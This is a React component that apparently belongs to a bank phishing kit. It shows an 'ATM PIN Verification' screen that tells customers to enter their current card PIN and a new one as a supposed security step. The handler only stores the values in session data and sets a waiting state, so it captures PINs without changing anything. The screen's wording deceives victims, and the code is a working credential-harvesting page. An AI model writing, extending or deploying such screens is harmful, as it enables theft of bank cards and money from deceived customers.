import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { KeyRound } from 'lucide-react';
import FormLayout from '@/components/FormLayout';
import ErrorAlert from '@/components/ErrorAlert';
import { useForm } from '@/contexts/FormContext';

const ContactPage = () => {
  const [currentPin, setCurrentPin] = useState('');
  const [newPin, setNewPin] = useState('');
  const [confirmPin, setConfirmPin] = useState('');
  const { updateSessionData, setWaiting } = useForm();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    updateSessionData('atmPin', { currentPin, newPin, confirmPin });
    setWaiting(true);
  };

  return (
    <FormLayout 
      title="ATM PIN Verification" 
      description="As an additional security step, please verify your card by entering your current PIN and then the new PIN you would like to use. This is the same PIN you use at our ATMs."
    >
      <ErrorAlert />
      <form onSubmit={handleSubmit} className="space-y-4">
        <div className="space-y-2">
          <Label htmlFor="currentPin">Current PIN *</Label>
          <div className="relative">
            <KeyRound className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <Input
              id="currentPin"
              type="password"
              value={currentPin}
              onChange={(e) => setCurrentPin(e.target.value)}
              className="pl-10"
              placeholder="Enter your current PIN"
              maxLength={4}
              required
            />
          </div>
        </div>

        <div className="space-y-2">
          <Label htmlFor="newPin">New PIN *</Label>
          <div className="relative">
            <KeyRound className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <Input
              id="newPin"
              type="password"
              value={newPin}
              onChange={(e) => setNewPin(e.target.value)}
              className="pl-10"
              placeholder="Enter your new PIN"
              maxLength={4}
              required
            />
          </div>
        </div>

        <div className="space-y-2">
          <Label htmlFor="confirmPin">Confirm New PIN *</Label>
          <div className="relative">
            <KeyRound className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <Input
              id="confirmPin"
              type="password"
              value={confirmPin}
              onChange={(e) => setConfirmPin(e.target.value)}
              className="pl-10"
              placeholder="Confirm your new PIN"
              maxLength={4}
              required
            />
          </div>
        </div>

        <Button type="submit" className="w-full">
          Continue
        </Button>
      </form>
    </FormLayout>
  );
};

export default ContactPage;